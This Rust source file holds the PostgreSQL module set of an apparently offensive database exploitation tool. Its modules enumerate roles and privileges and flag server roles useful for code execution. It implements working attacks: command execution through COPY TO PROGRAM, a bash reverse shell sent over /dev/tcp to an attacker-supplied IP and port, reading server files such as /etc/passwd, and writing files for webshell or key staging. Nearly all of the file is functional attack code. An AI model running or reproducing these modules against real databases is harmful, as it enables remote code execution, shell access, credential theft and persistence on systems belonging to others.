//! PostgreSQL modules — verify-then-execute. check() never mutates state.

use crate::{classify, query_text};
use async_trait::async_trait;
use dbx_core::*;
use std::sync::Arc;
use tokio_postgres::Client;

pub fn catalog() -> Vec<ModuleMeta> {
    vec![
        EnumRoles::META,
        EnumPrivs::META,
        CopyRce::META,
        FileRead::META,
        FileWrite::META,
    ]
}

pub fn instantiate(name: &str, client: Arc<Client>) -> Result<Box<dyn Module>, AuthError> {
    match name {
        "enum-roles" => Ok(Box::new(EnumRoles { client })),
        "enum-privs" => Ok(Box::new(EnumPrivs { client })),
        "copy-rce" => Ok(Box::new(CopyRce { client })),
        "file-read" => Ok(Box::new(FileRead { client })),
        "file-write" => Ok(Box::new(FileWrite { client })),
        _ => Err(AuthError::Protocol(format!(
            "unknown module '{name}' (try -L)"
        ))),
    }
}

// ---------- shared helpers ----------

async fn is_superuser(c: &Client) -> Result<bool, AuthError> {
    let rows = query_text(c, "SELECT usesuper FROM pg_user WHERE usename = current_user").await?;
    Ok(rows
        .first()
        .and_then(|r| r.first())
        .map(|s| s == "t")
        .unwrap_or(false))
}

/// pg_has_role: is current_user a member of a built-in server role?
async fn has_server_role(c: &Client, role: &str) -> Result<bool, AuthError> {
    let row = c
        .query_one("SELECT pg_has_role(current_user, $1, 'MEMBER')", &[&role])
        .await
        .map_err(|e| classify(&e))?;
    Ok(row.get(0))
}

async fn version_num(c: &Client) -> Result<i64, AuthError> {
    let rows = query_text(c, "SHOW server_version_num").await?;
    Ok(rows
        .first()
        .and_then(|r| r.first())
        .and_then(|s| s.parse().ok())
        .unwrap_or(0))
}

async fn version_str(c: &Client) -> String {
    query_text(c, "SHOW server_version")
        .await
        .ok()
        .and_then(|r| r.first().and_then(|r| r.first().cloned()))
        .unwrap_or_else(|| "?".into())
}

fn req<'a>(opts: &'a ModuleOptions, key: &str) -> Result<&'a String, AuthError> {
    opts.get(key).ok_or_else(|| {
        AuthError::Protocol(format!(
            "missing required option --{}",
            key.to_lowercase().replace('_', "-")
        ))
    })
}

fn ok_check(detail: String) -> Result<CheckResult, AuthError> {
    Ok(CheckResult { possible: true, detail })
}

// ---------- enum-roles ----------

struct EnumRoles {
    client: Arc<Client>,
}

impl EnumRoles {
    const META: ModuleMeta = ModuleMeta {
        name: "enum-roles",
        description: "List all roles with their privilege flags (superuser, createrole, createdb, login, replication)",
        opsec: Opsec::Green,
        options: &[],
    };
}

#[async_trait]
impl Module for EnumRoles {
    fn meta(&self) -> ModuleMeta {
        Self::META
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        ok_check("read-only catalog query".into())
    }

    async fn run(&self, _opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let rows = query_text(
            &self.client,
            "SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin, rolreplication
             FROM pg_roles ORDER BY rolsuper DESC, rolname",
        )
        .await?;
        let lines = rows
            .iter()
            .map(|r| {
                let mut flags = Vec::new();
                if r.get(1).map(|s| s.as_str()) == Some("t") { flags.push("SUPERUSER"); }
                if r.get(2).map(|s| s.as_str()) == Some("t") { flags.push("createrole"); }
                if r.get(3).map(|s| s.as_str()) == Some("t") { flags.push("createdb"); }
                if r.get(4).map(|s| s.as_str()) == Some("t") { flags.push("login"); }
                if r.get(5).map(|s| s.as_str()) == Some("t") { flags.push("replication"); }
                format!(
                    "{} [{}]",
                    r.first().map(|s| s.as_str()).unwrap_or("?"),
                    flags.join(", ")
                )
            })
            .collect();
        Ok(ModuleResult { lines })
    }
}

// ---------- enum-privs ----------

struct EnumPrivs {
    client: Arc<Client>,
}

impl EnumPrivs {
    const META: ModuleMeta = ModuleMeta {
        name: "enum-privs",
        description: "Show current user's privileges and role memberships — flags RCE-relevant server roles (pg_execute_server_program, pg_read/write_server_files)",
        opsec: Opsec::Green,
        options: &[],
    };
}

#[async_trait]
impl Module for EnumPrivs {
    fn meta(&self) -> ModuleMeta {
        Self::META
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        ok_check("read-only catalog query".into())
    }

    async fn run(&self, _opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let mut lines = Vec::new();
        let me = query_text(&self.client, "SELECT current_user").await?;
        let me = me
            .first()
            .and_then(|r| r.first())
            .cloned()
            .unwrap_or_default();
        let superuser = is_superuser(&self.client).await?;
        lines.push(format!(
            "user: {me}{}",
            if superuser { " (SUPERUSER)" } else { "" }
        ));

        let memberships = query_text(
            &self.client,
            "SELECT r.rolname FROM pg_auth_members m
             JOIN pg_roles r ON r.oid = m.roleid
             WHERE m.member = (SELECT oid FROM pg_roles WHERE rolname = current_user)",
        )
        .await?;
        if memberships.is_empty() {
            lines.push("role memberships: none".into());
        } else {
            for m in &memberships {
                let role = m.first().map(|s| s.as_str()).unwrap_or("?");
                let note = match role {
                    "pg_execute_server_program" => {
                        "  <-- COPY TO PROGRAM without superuser (effectively RCE)"
                    }
                    "pg_read_server_files" => "  <-- file-read without superuser",
                    "pg_write_server_files" => "  <-- file-write without superuser",
                    _ => "",
                };
                lines.push(format!("member of: {role}{note}"));
            }
        }
        Ok(ModuleResult { lines })
    }
}

// ---------- copy-rce ----------

struct CopyRce {
    client: Arc<Client>,
}

impl CopyRce {
    const META: ModuleMeta = ModuleMeta {
        name: "copy-rce",
        description: "RCE via COPY TO PROGRAM. Needs superuser (or pg_execute_server_program). --cmd runs a command and prints its output; --atk-ip/--atk-port sends a bash reverse shell",
        opsec: Opsec::Amber,
        options: &[
            ModuleOpt { name: "CMD", description: "run this OS command and print its output (quick check)", required: false },
            ModuleOpt { name: "ATK_IP", description: "your listener IP/hostname for the reverse shell", required: false },
            ModuleOpt { name: "ATK_PORT", description: "your listener port for the reverse shell", required: false },
        ],
    };
}

#[async_trait]
impl Module for CopyRce {
    fn meta(&self) -> ModuleMeta {
        Self::META
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        let vnum = version_num(&self.client).await?;
        if vnum < 90300 {
            return Ok(CheckResult {
                possible: false,
                detail: format!(
                    "server too old ({}) — COPY TO PROGRAM needs 9.3+",
                    version_str(&self.client).await
                ),
            });
        }
        if is_superuser(&self.client).await? {
            return ok_check(format!(
                "superuser on PostgreSQL {} — COPY TO PROGRAM available",
                version_str(&self.client).await
            ));
        }
        if has_server_role(&self.client, "pg_execute_server_program").await? {
            return ok_check(format!(
                "member of pg_execute_server_program on PostgreSQL {} — COPY TO PROGRAM available without superuser",
                version_str(&self.client).await
            ));
        }
        Ok(CheckResult {
            possible: false,
            detail: format!(
                "not superuser, not pg_execute_server_program ({})",
                version_str(&self.client).await
            ),
        })
    }

    async fn run(&self, opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        // reverse shell path: fire and forget, the listener is the truth
        if opts.get("CMD").is_none() {
            let ip = req(opts, "ATK_IP")?;
            let port = req(opts, "ATK_PORT")?;
            let payload = format!(
                "setsid bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\" < /dev/null &"
            );
            let esc = payload.replace('\'', "''");
            query_text(&self.client, &format!("COPY (SELECT '') TO PROGRAM '{esc}'")).await?;
            return Ok(ModuleResult {
                lines: vec![
                    format!("dispatched: {payload}"),
                    "shell runs as the postgres OS user — check your listener".into(),
                ],
            });
        }

        // --cmd path: execute, capture stdout+stderr via temp file, clean up.
        // COPY TO PROGRAM discards the command's stdout, so:
        //   1. run `(cmd) > tmpfile 2>&1; true`   (; true => COPY always exits 0,
        //      decoupling "did it run" from the command's own exit code)
        //   2. pg_read_file(tmpfile)
        //   3. rm tmpfile (best effort)
        let cmd = opts.get("CMD").unwrap();
        let tmp = format!(
            "/tmp/.dbx_out_{}",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.subsec_nanos())
                .unwrap_or(0)
        );
        let wrapped = format!("({cmd}) > {tmp} 2>&1; true").replace('\'', "''");
        query_text(&self.client, &format!("COPY (SELECT '') TO PROGRAM '{wrapped}'")).await?;

        let row = self
            .client
            .query_one("SELECT pg_read_file($1)", &[&tmp])
            .await
            .map_err(|e| classify(&e))?;
        let out: String = row.get(0);

        let rm = format!("rm -f {tmp}").replace('\'', "''");
        let _ = query_text(&self.client, &format!("COPY (SELECT '') TO PROGRAM '{rm}'")).await;

        let mut lines = vec![format!("$ {cmd}")];
        lines.extend(out.trim_end().lines().map(|l| l.to_string()));
        Ok(ModuleResult { lines })
    }
}

// ---------- file-read ----------

struct FileRead {
    client: Arc<Client>,
}

impl FileRead {
    const META: ModuleMeta = ModuleMeta {
        name: "file-read",
        description: "Read a file from the server filesystem (pg_read_file). Needs superuser or pg_read_server_files",
        opsec: Opsec::Green,
        options: &[
            ModuleOpt { name: "PATH", description: "absolute path on the server, e.g. /etc/passwd", required: true },
        ],
    };
}

#[async_trait]
impl Module for FileRead {
    fn meta(&self) -> ModuleMeta {
        Self::META
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        if is_superuser(&self.client).await? {
            return ok_check("superuser — pg_read_file unrestricted".into());
        }
        if has_server_role(&self.client, "pg_read_server_files").await? {
            return ok_check("member of pg_read_server_files".into());
        }
        Ok(CheckResult {
            possible: false,
            detail: "not superuser, not pg_read_server_files".into(),
        })
    }

    async fn run(&self, opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let path = req(opts, "PATH")?;
        let row = self
            .client
            .query_one("SELECT pg_read_file($1)", &[path])
            .await
            .map_err(|e| classify(&e))?;
        let content: String = row.get(0);
        Ok(ModuleResult {
            lines: vec![format!("--- {path} ---"), content],
        })
    }
}

// ---------- file-write ----------

struct FileWrite {
    client: Arc<Client>,
}

impl FileWrite {
    const META: ModuleMeta = ModuleMeta {
        name: "file-write",
        description: "Write a file to the server filesystem via COPY TO FILE (webshell/key staging). Needs superuser or pg_write_server_files. RED: leaves a persistent artifact — requires --force",
        opsec: Opsec::Red,
        options: &[
            ModuleOpt { name: "PATH", description: "absolute destination path on the server", required: true },
            ModuleOpt { name: "CONTENT", description: "file content (a trailing newline is added by COPY)", required: true },
        ],
    };
}

#[async_trait]
impl Module for FileWrite {
    fn meta(&self) -> ModuleMeta {
        Self::META
    }

    async fn check(&self) -> Result<CheckResult, AuthError> {
        if is_superuser(&self.client).await? {
            return ok_check("superuser — COPY TO FILE unrestricted".into());
        }
        if has_server_role(&self.client, "pg_write_server_files").await? {
            return ok_check("member of pg_write_server_files".into());
        }
        Ok(CheckResult {
            possible: false,
            detail: "not superuser, not pg_write_server_files".into(),
        })
    }

    async fn run(&self, opts: &ModuleOptions) -> Result<ModuleResult, AuthError> {
        let path = req(opts, "PATH")?;
        let content = req(opts, "CONTENT")?;
        if content.contains("$dbx$") {
            return Err(AuthError::Protocol(
                "content contains delimiter $dbx$".into(),
            ));
        }
        let esc_path = path.replace('\'', "''");
        query_text(
            &self.client,
            &format!("COPY (SELECT $dbx${content}$dbx$) TO '{esc_path}'"),
        )
        .await?;
        Ok(ModuleResult {
            lines: vec![
                format!("wrote {} bytes -> {path}", content.len()),
                "RED module: artifact persists on the server — clean up when done".into(),
            ],
        })
    }
}
